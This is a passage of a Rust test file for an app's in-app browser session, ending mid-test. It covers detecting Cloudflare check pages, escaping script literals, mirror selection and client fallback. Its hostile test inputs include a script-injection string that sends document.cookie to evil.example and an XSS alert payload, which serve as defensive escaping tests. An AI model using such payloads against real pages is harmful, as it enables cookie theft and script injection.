//! The in-app browser session, as far as it can be exercised without a window or the network:
//! recognising check and block pages, the scripts run in a site's page, reading their answers,
//! the mirror walk, and the decision to fall back from the plain client to the session.

use anilili_lib::error::AppError;
use anilili_lib::plugins::net::{NetContext, WireRequest};
use anilili_lib::providers::common::{path_and_query, session_headers};
use anilili_lib::web_session::{
    self, collect_script, cancel_script, detect_barrier, js_string, order_origins, parse_collected,
    request_script, valid_request_path, Barrier, Collected, SessionChoice, SessionState, SessionUse,
    SiteSession, SiteSpec, Walk, WalkStep, WebResponse, CAPTURED_HEADERS, COMMIT_GRACE, LOAD_TIMEOUT, MAX_BODY_CHARS, MAX_RELOADS,
    WALK_COOLDOWN,
};
use async_trait::async_trait;
use serde_json::{json, Value};
use std::collections::{HashMap, VecDeque};
use std::io::Write;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

// ---------------------------------------------------------------- fixtures

/// Head of the page Cloudflare answers a refused client with (HTTP 403).
const CLOUDFLARE_BLOCK_PAGE: &str = r#"<!DOCTYPE html>
<html class="no-js" lang="en-US">
<head>
<title>Attention Required! | Cloudflare</title>
<meta charset="UTF-8" />
<link rel="stylesheet" id="cf_styles-css" href="/cdn-cgi/styles/cf.errors.css" />
</head>
<body>
  <div id="cf-wrapper">
    <div id="cf-error-details" class="cf-error-details-wrapper">
      <h1 data-translate="block_headline">Sorry, you have been blocked</h1>
      <h2 class="cf-subheadline"><span data-translate="unable_to_access">You are unable to access</span> miruro.bz</h2>
    </div>
  </div>
  <script>(function(){var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';})();</script>
</body>
</html>"#;

/// Head of Cloudflare's interactive check (HTTP 403 with `cf-mitigated: challenge`).
const CLOUDFLARE_CHALLENGE_PAGE: &str = r#"<!DOCTYPE html><html lang="en-US"><head><title>Just a moment...</title><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="robots" content="noindex,nofollow"><meta http-equiv="content-security-policy" content="default-src &#39;none&#39;; connect-src &#39;self&#39; https://challenges.cloudflare.com"></head><body><div class="main-wrapper" role="main"><noscript>Enable JavaScript and cookies to continue</noscript></div><script nonce="x">(function(){window._cf_chl_opt = {cvId: '3',cZone: 'animepahe.pw',cType: 'managed'};var a = document.createElement('script');a.src = '/cdn-cgi/challenge-platform/h/g/orchestrate/chl_page/v1?ray=1';})();</script></body></html>"#;

/// A page of the site itself, which loads the protection's scripts like every proxied page.
const ORDINARY_SITE_PAGE: &str = r#"<!doctype html><html lang="en"><head><title>Miruro · Watch Anime</title></head><body><div id="root"></div><script>(function(){var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.head.appendChild(a);})();</script></body></html>"#;

fn headers(pairs: &[(&str, &str)]) -> HashMap<String, String> {
    pairs.iter().map(|(n, v)| (n.to_string(), v.to_string())).collect()
}

// ---------------------------------------------------------------- recognising a refusal

#[test]
fn cloudflare_check_and_block_pages_are_told_apart() {
    let none = HashMap::new();
    assert_eq!(detect_barrier(403, &none, CLOUDFLARE_BLOCK_PAGE), Some(Barrier::Block));
    assert_eq!(detect_barrier(403, &none, CLOUDFLARE_CHALLENGE_PAGE), Some(Barrier::Challenge));
    assert_eq!(detect_barrier(503, &none, CLOUDFLARE_CHALLENGE_PAGE), Some(Barrier::Challenge));

    // The header alone is enough, whatever the status and body.
    let mitigated = headers(&[("cf-mitigated", "challenge")]);
    assert_eq!(detect_barrier(403, &mitigated, ""), Some(Barrier::Challenge));
    assert_eq!(detect_barrier(200, &mitigated, "{}"), Some(Barrier::Challenge));

    let other_guards = [
        "<html><head><title>DDoS-Guard</title></head><body>Checking your browser before accessing</body></html>",
        "<html><body><div class=\"cf-turnstile\" data-sitekey=\"k\"></div></body></html>",
    ];
    for body in other_guards {
        assert_eq!(detect_barrier(403, &none, body), Some(Barrier::Challenge), "{}", body);
    }
    assert_eq!(detect_barrier(403, &none, "error code: 1020"), Some(Barrier::Block));
}

#[test]
fn real_answers_are_not_mistaken_for_a_refusal() {
    let none = HashMap::new();
    // The site's own page carries the protection's script without being a check.
    assert_eq!(detect_barrier(200, &none, ORDINARY_SITE_PAGE), None);
    // A check page body under a success status is the site showing text, not a refusal.
    assert_eq!(detect_barrier(200, &none, CLOUDFLARE_CHALLENGE_PAGE), None);
    // The API's own errors.
    assert_eq!(detect_barrier(403, &none, r#"{"error":"forbidden"}"#), None);
    assert_eq!(detect_barrier(503, &none, "upstream unavailable"), None);
    assert_eq!(detect_barrier(404, &none, CLOUDFLARE_BLOCK_PAGE), None);
    assert_eq!(detect_barrier(500, &headers(&[("cf-mitigated", "none")]), ""), None);

    // Only the head of a body is searched, and a multi-byte character on the limit is fine.
    let late = format!("{}{}", "é".repeat(40_000), "Just a moment");
    assert_eq!(detect_barrier(403, &none, &late), None);
}

// ---------------------------------------------------------------- scripts run in the page

const HOSTILE: [&str; 9] = [
    "/api?q=\"quoted\"",
    "/api?q='single'&x=`tick`",
    "/back\\slash\\\\double",
    "/x</script><script>alert(1)</script>",
    "/line\nbreak\r\nand\ttab",
    "/sep\u{2028}arators\u{2029}",
    "/nul\u{0}and\u{1f}control\u{7f}",
    "/\");fetch(\"https://evil.example/\"+document.cookie);(\"",
    "/ünï¢ødé/日本語?e=✓",
];

#[test]
fn js_strings_cannot_end_their_literal() {
    for value in HOSTILE {
        let literal = js_string(value);
        // The escapes used are the ones JSON has, so a JSON reader decodes the literal exactly.
        assert_eq!(serde_json::from_str::<String>(&literal).unwrap(), value, "{}", literal);

        let inner = &literal[1..literal.len() - 1];
        for forbidden in ['<', '>', '&', '\'', '`', '\n', '\r', '\u{2028}', '\u{2029}'] {
            assert!(!inner.contains(forbidden), "{:?} left in {}", forbidden, literal);
        }
        assert!(!inner.chars().any(|c| c.is_control()), "{}", literal);
        // Every quote inside is escaped.
        let mut escaped = false;
        for c in inner.chars() {
            assert!(escaped || c != '"', "bare quote in {}", literal);
            escaped = !escaped && c == '\\';
        }
    }
}

/// Reads the string literal that starts at `at` and returns its value and what follows it.
fn literal_at(script: &str, at: usize) -> (String, &str) {
    let mut stream = serde_json::Deserializer::from_str(&script[at..]).into_iter::<String>();
    let value = stream.next().expect("a literal").expect("a well-formed literal");
    (value, &script[at + stream.byte_offset()..])
}

#[test]
fn request_script_keeps_hostile_input_inside_its_literals() {
    for value in HOSTILE {
        let sent_headers = vec![(format!("X-{}", value), value.to_string())];
        let script = request_script(value, "https://site.example", value, &sent_headers);
        assert!(!script.contains("</script"), "{}", script);
        assert!(!script.contains('\n') && !script.contains('\u{2028}'), "{}", script);

        let (key, rest) = literal_at(&script, script.find("var k=").unwrap() + "var k=".len());
        assert_eq!(key, value);
        assert!(rest.starts_with(",o=\"https://site.example\",s={done:false};"), "{}", rest);

        let (path, rest) = literal_at(&script, script.find("fetch(o+").unwrap() + "fetch(o+".len());
        assert_eq!(path, value);
        assert!(rest.starts_with(",{method:\"GET\",headers:h,credentials:\"include\""), "{}", rest);

        let pair_at = script.find("var h={};[[").unwrap() + "var h={};[[".len();
        let (name, rest) = literal_at(&script, pair_at);
        assert_eq!(name, format!("X-{}", value));
        let (sent, rest) = literal_at(rest, 1);
        assert_eq!(sent, value);
        assert!(rest.starts_with("]].forEach("), "{}", rest);

        for script in [collect_script(value), cancel_script(value)] {
            let (key, rest) = literal_at(&script, script.find("var k=").unwrap() + "var k=".len());
            assert_eq!(key, value);
            assert!(rest.starts_with(",s=window[k];"), "{}", rest);
        }
    }
}

#[test]
fn request_script_asks_only_its_own_origin() {
    let script = request_script("key", "https://www.miruro.bz", "/api/secure/pipe?e=abc", &[]);
    // The request address is the page's origin plus a path, and the page must be on it.
    assert!(script.contains("if(location.origin!==o){finish({elsewhere:String(location.origin)});return}"));
    assert!(script.contains("fetch(o+\"/api/secure/pipe?e=abc\","));
    assert!(script.contains("credentials:\"include\""));
    for name in CAPTURED_HEADERS {
        assert!(script.contains(&format!("\"{}\"", name)), "{}", name);
    }
    assert!(script.contains(&format!("b.length>{}", MAX_BODY_CHARS)));

    for path in ["/api?m=search&q=one%20piece", "/play/a/b", "/"] {
        assert!(valid_request_path(path), "{}", path);
    }
    for path in [
        "",
        "api",
        "//evil.example/x",
        "/\\evil.example/x",
        "https://evil.example/",
        "/a\nb",
        "/a#fragment",
    ] {
        assert!(!valid_request_path(path), "{:?}", path);
    }
}

/// Runs the page scripts in a real JavaScript engine against a stand-in page. Skipped where no
/// `node` is installed; the scripts' text is covered by the tests above either way.
#[test]
fn page_scripts_behave_in_a_javascript_engine_when_node_is_installed() {
    let request = request_script(
        "__k1",
        "https://site.example",
        "/api?q=\"a\"</script>\n",
        &[("Accept".to_string(), "*/*".to_string())],
    );
    let wrong_origin = request_script("__k2", "https://other.example", "/x", &[]);
    let failing = request_script("__k3", "https://site.example", "/fail", &[]);
    let huge = request_script("__k4", "https://site.example", "/huge", &[]);
    let abandoned = request_script("__k5", "https://site.example", "/never", &[]);

    let harness = format!(
        r#"
const seen = [];
globalThis.window = globalThis;
globalThis.location = {{ origin: "https://site.example" }};
globalThis.fetch = (url, init) => {{
  seen.push({{ url, init: {{ method: init.method, headers: init.headers, credentials: init.credentials }} }});
  if (url.endsWith("/fail")) return Promise.reject(new TypeError("Load failed"));
  if (url.endsWith("/never")) return new Promise((_, reject) => init.signal.addEventListener("abort", () => reject(new Error("aborted"))));
  const body = url.endsWith("/huge") ? "x".repeat({limit} + 1) : "{{\"ok\":true}}";
  const headers = new Map([["content-type", "application/json"], ["retry-after", "2"], ["set-cookie", "secret=1"]]);
  return Promise.resolve({{ status: 200, headers: {{ get: (n) => headers.has(n) ? headers.get(n) : null }}, text: () => Promise.resolve(body) }});
}};
const run = (code) => (0, eval)(code);
const out = {{}};
out.before = run({collect1});
run({request});
out.enumerable = Object.keys(window).includes("__k1");
out.pending = run({collect1});
run({wrong_origin});
run({failing});
run({huge});
run({abandoned});
setTimeout(() => {{
  out.answer = run({collect1});
  out.again = run({collect1});
  out.elsewhere = run({collect2});
  out.failed = run({collect3});
  out.huge = run({collect4});
  out.unfinished = run({collect5});
  run({cancel5});
  out.cancelled = run({collect5});
  out.seen = seen;
  console.log(JSON.stringify(out));
}}, 50);
"#,
        limit = MAX_BODY_CHARS,
        request = js_string(&request),
        wrong_origin = js_string(&wrong_origin),
        failing = js_string(&failing),
        huge = js_string(&huge),
        abandoned = js_string(&abandoned),
        collect1 = js_string(&collect_script("__k1")),
        collect2 = js_string(&collect_script("__k2")),
        collect3 = js_string(&collect_script("__k3")),
        collect4 = js_string(&collect_script("__k4")),
        collect5 = js_string(&collect_script("__k5")),
        cancel5 = js_string(&cancel_script("__k5")),
    );

    let child = std::process::Command::new("node")
        .arg("-")
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn();
    let Ok(mut child) = child else {
        eprintln!("node is not installed; the page scripts were not run");
        return;
    };
    child.stdin.take().unwrap().write_all(harness.as_bytes()).unwrap();
    let output = child.wait_with_output().unwrap();
    assert!(output.status.success(), "{}", String::from_utf8_lossy(&output.stderr));
    let out: Value = serde_json::from_slice(&output.stdout).expect("harness output");

    // What the webview hands back is the JSON form of each value.
    let collected = |name: &str| parse_collected(&out[name].to_string());
    assert_eq!(collected("before"), Collected::Gone);
    assert_eq!(collected("pending"), Collected::Pending);
    assert_eq!(out["enumerable"], json!(false));
    assert_eq!(
        collected("answer"),
        Collected::Response {
            status: 200,
            headers: headers(&[("content-type", "application/json"), ("retry-after", "2")]),
            body: "{\"ok\":true}".to_string(),
        }
    );
    // An answer is handed over once and leaves nothing behind in the page.
    assert_eq!(collected("again"), Collected::Gone);
    assert_eq!(collected("elsewhere"), Collected::Elsewhere("https://site.example".to_string()));
    assert_eq!(collected("failed"), Collected::Failed("TypeError: Load failed".to_string()));
    assert_eq!(collected("huge"), Collected::TooLarge);
    assert_eq!(collected("unfinished"), Collected::Pending);
    assert_eq!(collected("cancelled"), Collected::Gone);

    let seen = out["seen"].as_array().unwrap();
    assert_eq!(seen.len(), 4, "the page on another origin must not be asked");
    assert_eq!(seen[0]["url"], json!("https://site.example/api?q=\"a\"</script>\n"));
    assert_eq!(seen[0]["init"]["method"], json!("GET"));
    assert_eq!(seen[0]["init"]["credentials"], json!("include"));
    assert_eq!(seen[0]["init"]["headers"], json!({ "Accept": "*/*" }));
}

// ---------------------------------------------------------------- reading the page's answer

#[test]
fn collected_values_are_read_strictly() {
    assert_eq!(parse_collected(""), Collected::NoAnswer);
    assert_eq!(parse_collected("   "), Collected::NoAnswer);
    assert_eq!(parse_collected("not json"), Collected::NoAnswer);
    assert_eq!(parse_collected("null"), Collected::Pending);
    assert_eq!(parse_collected("\"gone\""), Collected::Gone);

    let answer = json!({
        "status": 200,
        "headers": { "retry-after": "2", "content-type": "text/plain", "set-cookie": "a=b", "server": 7 },
        "body": "payload",
        "truncated": false
    });
    let expected = Collected::Response {
        status: 200,
        headers: headers(&[("retry-after", "2"), ("content-type", "text/plain")]),
        body: "payload".to_string(),
    };
    // The script hands over JSON text, which the webview serialises as a JSON string.
    assert_eq!(parse_collected(&Value::String(answer.to_string()).to_string()), expected);
    // The object itself is read the same way.
    assert_eq!(parse_collected(&answer.to_string()), expected);

    let wrapped = |value: Value| parse_collected(&Value::String(value.to_string()).to_string());
    assert_eq!(wrapped(json!({ "error": "TypeError: Load failed" })), Collected::Failed("TypeError: Load failed".into()));
    assert_eq!(wrapped(json!({ "elsewhere": "null" })), Collected::Elsewhere("null".into()));
    assert_eq!(wrapped(json!({ "status": 200, "body": "", "truncated": true })), Collected::TooLarge);

    let unreadable = Collected::Failed("unreadable answer".to_string());
    for bad in [
        json!({ "status": 700, "body": "x" }),
        json!({ "status": "200", "body": "x" }),
        json!({ "status": 200 }),
        json!({ "status": 200, "body": 5 }),
        json!({ "status": -1, "body": "x" }),
        json!([200, "x"]),
        json!(42),
    ] {
        assert_eq!(wrapped(bad.clone()), unreadable, "{}", bad);
    }
    assert_eq!(parse_collected("\"{not json\""), unreadable);

    // Long values from the page are cut, not trusted.
    let long = "v".repeat(5000);
    match wrapped(json!({ "status": 204, "headers": { "server": long }, "body": "" })) {
        Collected::Response { status, headers, .. } => {
            assert_eq!(status, 204);
            assert_eq!(headers["server"].len(), 1024);
        }
        other => panic!("unexpected: {:?}", other),
    }
    match wrapped(json!({ "error": "e".repeat(5000) })) {
        Collected::Failed(reason) => assert_eq!(reason.len(), 200),
        other => panic!("unexpected: {:?}", other),
    }
}

// ---------------------------------------------------------------- choosing a mirror

const MIRRORS: [&str; 4] = [
    "https://www.site.to",
    "https://www.site.bz",
    "https://www.site.ru",
    "https://www.site.tv",
];

#[test]
fn mirrors_that_accept_connections_come_first() {
    let all = [true; 4];
    assert_eq!(order_origins(4, None, &all), vec![0, 1, 2, 3]);
    // The mirror that answered last starts, without dropping the others.
    assert_eq!(order_origins(4, Some(2), &all), vec![2, 0, 1, 3]);
    assert_eq!(order_origins(4, Some(9), &all), vec![0, 1, 2, 3]);
    // Mirrors the system resolver sends nowhere go last but are still tried.
    assert_eq!(order_origins(4, None, &[false, true, true, false]), vec![1, 2, 0, 3]);
    assert_eq!(order_origins(4, Some(0), &[false, true, true, false]), vec![1, 2, 0, 3]);
    assert_eq!(order_origins(4, Some(2), &[false, true, true, false]), vec![2, 1, 0, 3]);
    // No information leaves the order alone.
    assert_eq!(order_origins(4, Some(3), &[]), vec![3, 0, 1, 2]);
    assert_eq!(order_origins(4, None, &[false; 4]), vec![0, 1, 2, 3]);
    assert!(order_origins(0, None, &[]).is_empty());
}

fn ready(origin: &str, since: Instant) -> WalkStep {
    WalkStep::Ready { origin: origin.to_string(), since }
}

#[test]
fn a_page_is_ready_once_it_finished_or_has_been_arriving_for_a_while() {
    let t0 = Instant::now();
    let mut walk = Walk::new(&MIRRORS);
    assert_eq!(walk.step(t0), WalkStep::Order);
    walk.begin(vec![1, 2, 0, 3]);
    assert_eq!(walk.step(t0), WalkStep::Load(MIRRORS[1].to_string()));
    assert_eq!(walk.step(t0), WalkStep::Wait);
    assert_eq!(walk.current(), Some(MIRRORS[1]));

    let committed = t0 + Duration::from_secs(1);
    walk.on_page(MIRRORS[1], false, committed);
    assert_eq!(walk.step(committed), WalkStep::Wait);
    let finished = committed + Duration::from_secs(1);
    walk.on_page(MIRRORS[1], true, finished);
    assert_eq!(walk.step(finished), ready(MIRRORS[1], finished));
    // The time it became ready does not move while the page stays.
    assert_eq!(walk.step(finished + Duration::from_secs(30)), ready(MIRRORS[1], finished));

    // A reload inside the site (a passed check, for one) starts the page over.
    let reloaded = finished + Duration::from_secs(40);
    walk.on_page(MIRRORS[1], false, reloaded);
    assert_eq!(walk.step(reloaded), WalkStep::Wait);
    // A page whose resources never finish is used after the grace period.
    let later = reloaded + COMMIT_GRACE;
    assert_eq!(walk.step(later), ready(MIRRORS[1], later));
}

#[test]
fn a_mirror_that_does_not_load_gives_way_to_the_next() {
    let t0 = Instant::now();
    let mut walk = Walk::new(&MIRRORS[..2]);
    walk.begin(vec![0, 1]);
    assert_eq!(walk.step(t0), WalkStep::Load(MIRRORS[0].to_string()));
    assert_eq!(walk.step(t0 + LOAD_TIMEOUT - Duration::from_millis(1)), WalkStep::Wait);
    // A finish without a commit is the abandoned load ending, not a page.
    walk.on_page(MIRRORS[0], true, t0 + Duration::from_secs(1));
    assert_eq!(walk.step(t0 + LOAD_TIMEOUT - Duration::from_millis(1)), WalkStep::Wait);

    let t1 = t0 + LOAD_TIMEOUT;
    assert_eq!(walk.step(t1), WalkStep::Load(MIRRORS[1].to_string()));
    let t2 = t1 + LOAD_TIMEOUT;
    match walk.step(t2) {
        WalkStep::Failed(reason) => assert_eq!(reason, "www.site.bz did not load in the in-app browser"),
        other => panic!("unexpected: {:?}", other),
    }
    // The site is left alone for a while, then the walk starts over.
    assert!(matches!(walk.step(t2 + WALK_COOLDOWN - Duration::from_millis(1)), WalkStep::Failed(_)));
    assert_eq!(walk.step(t2 + WALK_COOLDOWN), WalkStep::Order);
}

#[test]
fn request_outcomes_move_the_walk() {
    let t0 = Instant::now();
    let mut walk = Walk::new(&MIRRORS[..3]);
    walk.begin(vec![0, 1, 2]);
    let load = |walk: &mut Walk, origin: &str, at: Instant| {
        assert_eq!(walk.step(at), WalkStep::Load(origin.to_string()));
        walk.on_page(origin, false, at);
        walk.on_page(origin, true, at);
        assert_eq!(walk.step(at), ready(origin, at));
    };
    load(&mut walk, MIRRORS[0], t0);

    // A failure reported for a mirror that is no longer in use changes nothing.
    walk.fail_origin(MIRRORS[1], "could not be reached", t0);
    assert_eq!(walk.current(), Some(MIRRORS[0]));
    // The page was WebKit's error page: the request failed, so the next mirror is loaded.
    walk.fail_origin(MIRRORS[0], "could not be reached", t0);
    load(&mut walk, MIRRORS[1], t0);

    // An answered request makes the mirror the one to start with next time.
    assert_eq!(walk.remembered(), None);
    walk.confirm(MIRRORS[0]);
    assert_eq!(walk.remembered(), None);
    walk.confirm(MIRRORS[1]);
    assert_eq!(walk.remembered(), Some(1));

    // A page that stopped answering is loaded again, a limited number of times.
    for _ in 0..MAX_RELOADS {
        walk.request_reload(MIRRORS[1], t0);
        // Several requests timing out together count once.
        walk.request_reload(MIRRORS[1], t0);
        load(&mut walk, MIRRORS[1], t0);
    }
    walk.request_reload(MIRRORS[1], t0);
    assert_eq!(walk.remembered(), None);
    load(&mut walk, MIRRORS[2], t0);

    // A plain refresh is not held against the mirror.
    for _ in 0..(MAX_RELOADS + 2) {
        walk.refresh(MIRRORS[2]);
        load(&mut walk, MIRRORS[2], t0);
    }

    // The window being closed keeps the mirror and loads it again.
    walk.reset_page();
    assert_eq!(walk.page_origin(), None);
    load(&mut walk, MIRRORS[2], t0);
}

#[test]
fn redirects_between_mirrors_are_followed_and_other_sites_are_left() {
    let t0 = Instant::now();
    let mut walk = Walk::new(&MIRRORS);
    walk.begin(vec![0, 1, 2, 3]);
    assert_eq!(walk.step(t0), WalkStep::Load(MIRRORS[0].to_string()));

    // The first mirror redirected to the last: that one is in use and the first is dropped.
    walk.on_page(MIRRORS[3], false, t0);
    walk.on_page(MIRRORS[3], true, t0);
    assert_eq!(walk.step(t0), ready(MIRRORS[3], t0));
    walk.fail_origin(MIRRORS[3], "could not be reached", t0);
    assert_eq!(walk.step(t0), WalkStep::Load(MIRRORS[1].to_string()));
    walk.on_page(MIRRORS[1], false, t0);
    walk.on_page(MIRRORS[1], true, t0);
    assert_eq!(walk.step(t0), ready(MIRRORS[1], t0));

    // The page went to another site: the mirror is loaded again, and given up on if it keeps
    // happening.
    for _ in 0..MAX_RELOADS {
        walk.on_page("https://ads.example", false, t0);
        assert_eq!(walk.page_origin(), Some("https://ads.example"));
        assert_eq!(walk.step(t0), WalkStep::Load(MIRRORS[1].to_string()));
        walk.on_page(MIRRORS[1], false, t0);
        walk.on_page(MIRRORS[1], true, t0);
        assert_eq!(walk.step(t0), ready(MIRRORS[1], t0));
    }
    walk.mark_drifted(MIRRORS[1]);
    assert_eq!(walk.step(t0), WalkStep::Load(MIRRORS[2].to_string()));
}

#[test]
fn the_caller_can_send_the_window_to_a_mirror_itself() {
    let t0 = Instant::now();
    let mut walk = Walk::new(&MIRRORS[..2]);
    // Nothing was tried yet; the verification window opens on the second mirror.
    walk.focus(MIRRORS[1], t0);
    assert_eq!(walk.current(), Some(MIRRORS[1]));
    assert_eq!(walk.step(t0), WalkStep::Wait);
    walk.on_page(MIRRORS[1], false, t0);
    walk.on_page(MIRRORS[1], true, t0);
    assert_eq!(walk.step(t0), ready(MIRRORS[1], t0));

    // It also ends a cooldown: the user asked for the site to be opened.
    walk.fail_all("the in-app browser could not be opened (no display)", t0);
    assert_eq!(
        walk.step(t0),
        WalkStep::Failed("the in-app browser could not be opened (no display)".to_string())
    );
    walk.focus(MIRRORS[0], t0);
    assert_eq!(walk.step(t0), WalkStep::Wait);
    walk.focus("https://unknown.example", t0);
    assert_eq!(walk.current(), Some(MIRRORS[0]));
}

// ---------------------------------------------------------------- without the app

static NO_APP_SITE: SiteSpec = SiteSpec {
    key: "no-app-site",
    label: "No App Site",
    origins: &["https://www.site.to"],
};

#[tokio::test]
async fn without_an_app_handle_every_operation_reports_it() {
    assert!(!web_session::is_available());
    assert!(!web_session::AppSession.available());
    assert!(!web_session::app_session().available());

    let fetched = web_session::fetch(&NO_APP_SITE, "/api", &[], Duration::from_secs(1)).await;
    assert_eq!(fetched.unwrap_err().reason(), "the in-app browser is not available");
    let opened = web_session::open_verification("no-app-site").await;
    assert_eq!(opened.unwrap_err().reason(), "the in-app browser is not available");
    assert!(web_session::verification_status().is_empty());

    assert_eq!(web_session::window_label("miruro"), "site-miruro");
    assert_eq!(web_session::window_label("Anime Pahe.pw"), "site-anime-pahe-pw");
    assert_eq!(web_session::window_title("Miruro"), "Verify to continue — Miruro");
}

#[test]
fn the_verification_error_says_what_is_needed() {
    let err = AppError::VerificationRequired {
        site: "miruro".to_string(),
        origin: "https://www.miruro.bz".to_string(),
    };
    assert_eq!(err.reason(), "needs verification");
    assert_eq!(err.to_string(), "miruro needs verification");
    assert!(!err.is_connection_failure());
}

// ---------------------------------------------------------------- falling back to the session

/// A loopback site answering every request the same way and counting them.
struct Site {
    base: &'static str,
    hits: Arc<AtomicUsize>,
}

impl Site {
    async fn start(status: u16, extra_header: Option<(&'static str, &'static str)>, body: &str) -> Site {
        let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind loopback");
        let base: &'static str = Box::leak(format!("http://{}", listener.local_addr().unwrap()).into_boxed_str());
        let hits = Arc::new(AtomicUsize::new(0));
        let body = body.to_string();
        let hits_by_server = hits.clone();
        tokio::spawn(async move {
            loop {
                let Ok((mut socket, _)) = listener.accept().await else { break };
                let (body, hits) = (body.clone(), hits_by_server.clone());
                tokio::spawn(async move {
                    let mut buffer = Vec::new();
                    let mut chunk = [0u8; 2048];
                    while !buffer.windows(4).any(|w| w == b"\r\n\r\n") {
                        match socket.read(&mut chunk).await {
                            Ok(0) | Err(_) => return,
                            Ok(n) => buffer.extend_from_slice(&chunk[..n]),
                        }
                    }
                    hits.fetch_add(1, Ordering::SeqCst);
                    let mut response = format!(
                        "HTTP/1.1 {} Status\r\nContent-Length: {}\r\nConnection: close\r\n",
                        status,
                        body.len()
                    );
                    if let Some((name, value)) = extra_header {
                        response.push_str(&format!("{}: {}\r\n", name, value));
                    }
                    response.push_str("\r\n");
                    response.push_str(&body);
                    let _ = socket.write_all(response.as_bytes()).await;
                    let _ = socket.shutdown().await;
                });
            }
        });
        Site { base, hits }
    }

    async fn blocked() -> Site {
        Site::start(403, None, CLOUDFLARE_BLOCK_PAGE).await
    }

    fn hits(&self) -> usize {
        self.hits.load(Ordering::SeqCst)
    }
}

type Call = (String, Vec<(String, String)>);

/// Stands in for the in-app browser: answers from a queue and records what it was asked.
struct FakeSession {
    available: bool,
    state: Mutex<SessionState>,
    answers: Mutex<VecDeque<Result<WebResponse, AppError>>>,
    calls: Mutex<Vec<Call>>,
}

impl FakeSession {
    /// A session without a window yet.
    fn new(available: bool, answers: Vec<Result<WebResponse, AppError>>) -> Arc<FakeSession> {
        Arc::new(FakeSession {
            available,
            state: Mutex::new(SessionState::Cold),
            answers: Mutex::new(answers.into()),
            calls: Mutex::new(Vec::new()),
        })
    }

    fn in_state(state: SessionState, answers: Vec<Result<WebResponse, AppError>>) -> Arc<FakeSession> {
        let session = FakeSession::new(true, answers);
        *session.state.lock().unwrap() = state;
        session
    }

    fn calls(&self) -> Vec<Call> {
        self.calls.lock().unwrap().clone()
    }
}

#[async_trait]
impl SiteSession for FakeSession {
    fn available(&self) -> bool {
        self.available
    }

    fn state(&self, _site: &'static SiteSpec) -> SessionState {
        self.state.lock().unwrap().clone()
    }

    async fn fetch(
        &self,
        _site: &'static SiteSpec,
        path_and_query: &str,
        headers: &[(&str, &str)],
        _timeout: Duration,
    ) -> Result<WebResponse, AppError> {
        self.calls.lock().unwrap().push((
            path_and_query.to_string(),
            headers.iter().map(|(n, v)| (n.to_string(), v.to_string())).collect(),
        ));
        self.answers
            .lock()
            .unwrap()
            .pop_front()
            .unwrap_or_else(|| Err(AppError::Other("the fake session has no answer left".to_string())))
    }
}

fn web_answer(status: u16, origin: &str, extra: &[(&str, &str)], body: &str) -> Result<WebResponse, AppError> {
    Ok(WebResponse {
        status,
        origin: origin.to_string(),
        headers: headers(extra),
        body: body.to_string(),
    })
}

// ---------------------------------------------------------------- when a session may be used

#[test]
fn a_session_is_only_started_when_the_lookup_may() {
    let refused = || SessionState::Refused("https://www.site.to".to_string());
    let choice = |session: &Arc<FakeSession>, access| web_session::choose(session.as_ref(), &NO_APP_SITE, access);

    // Asked for by name, or as the last resort: whatever the session's state.
    for state in [SessionState::Cold, SessionState::Warm, refused()] {
        let session = FakeSession::in_state(state, vec![]);
        assert!(matches!(choice(&session, SessionUse::Create), SessionChoice::Ask));
    }
    // One provider among many: only a session that exists and answers.
    let warm = FakeSession::in_state(SessionState::Warm, vec![]);
    assert!(matches!(choice(&warm, SessionUse::Existing), SessionChoice::Ask));
    let cold = FakeSession::in_state(SessionState::Cold, vec![]);
    assert!(matches!(choice(&cold, SessionUse::Existing), SessionChoice::Keep));
    // A site known to wait for the user says so without anything being asked or opened.
    match choice(&FakeSession::in_state(refused(), vec![]), SessionUse::Existing) {
        SessionChoice::Refused(AppError::VerificationRequired { site, origin }) => {
            assert_eq!((site.as_str(), origin.as_str()), ("no-app-site", "https://www.site.to"));
        }
        other => panic!("unexpected: {:?}", other),
    }
    // Without the in-app browser there is nothing to choose.
    let none = FakeSession::new(false, vec![]);
    assert!(matches!(choice(&none, SessionUse::Create), SessionChoice::Keep));
    assert!(matches!(choice(&none, SessionUse::Existing), SessionChoice::Keep));
    assert_eq!(web_session::session_state(&NO_APP_SITE), SessionState::Cold);
}

fn plugin_request(url: &str, method: &str, headers: &[(&str, &str)]) -> WireRequest {
    serde_json::from_value(json!({ "url": url, "method": method, "headers": headers })).expect("request")
}

#[tokio::test]
async fn plugin_requests_fall_back_to_the_session_only_for_a_refusal() {
    // A site that answers is never asked through the session.
    let open = Site::start(200, None, r#"{"ok":true}"#).await;
    let idle = FakeSession::new(true, vec![]);
    let net = NetContext::new("plugin", idle.clone(), true);
    let started = Instant::now();
    let answer = net
        .perform(plugin_request(&format!("{}/api?m=search&q=a", open.base), "GET", &[]), vec![], SessionUse::Create)
        .await
        .unwrap();
    assert_eq!(answer.meta.status, 200);
    assert!(idle.calls().is_empty());
    assert!(net.failure_since(started).is_none());

    // One plugin among many: a refusal stays a refusal while no session exists, and the
    // plugin still gets the site's own answer.
    let blocked = Site::blocked().await;
    let cold = FakeSession::new(true, vec![]);
    let net = NetContext::new("plugin", cold.clone(), true);
    let started = Instant::now();
    let answer = net
        .perform(plugin_request(&format!("{}/api", blocked.base), "GET", &[]), vec![], SessionUse::Existing)
        .await
        .unwrap();
    assert_eq!(answer.meta.status, 403);
    assert!(cold.calls().is_empty());
    assert!(matches!(net.failure_since(started), Some(AppError::CaptchaRequired)));

    // Only a plain GET can be repeated inside the site's page.
    let unused = FakeSession::new(true, vec![]);
    let net = NetContext::new("plugin", unused.clone(), true);
    let answer = net
        .perform(plugin_request(&format!("{}/api", blocked.base), "POST", &[]), b"x".to_vec(), SessionUse::Create)
        .await
        .unwrap();
    assert_eq!(answer.meta.status, 403);
    assert!(unused.calls().is_empty());

    // Asked for by name: the session answers, with the path and the headers a page may set.
    // The plain client was refused a moment ago and is not tried again first.
    let plain_requests = blocked.hits();
    let asking = FakeSession::new(
        true,
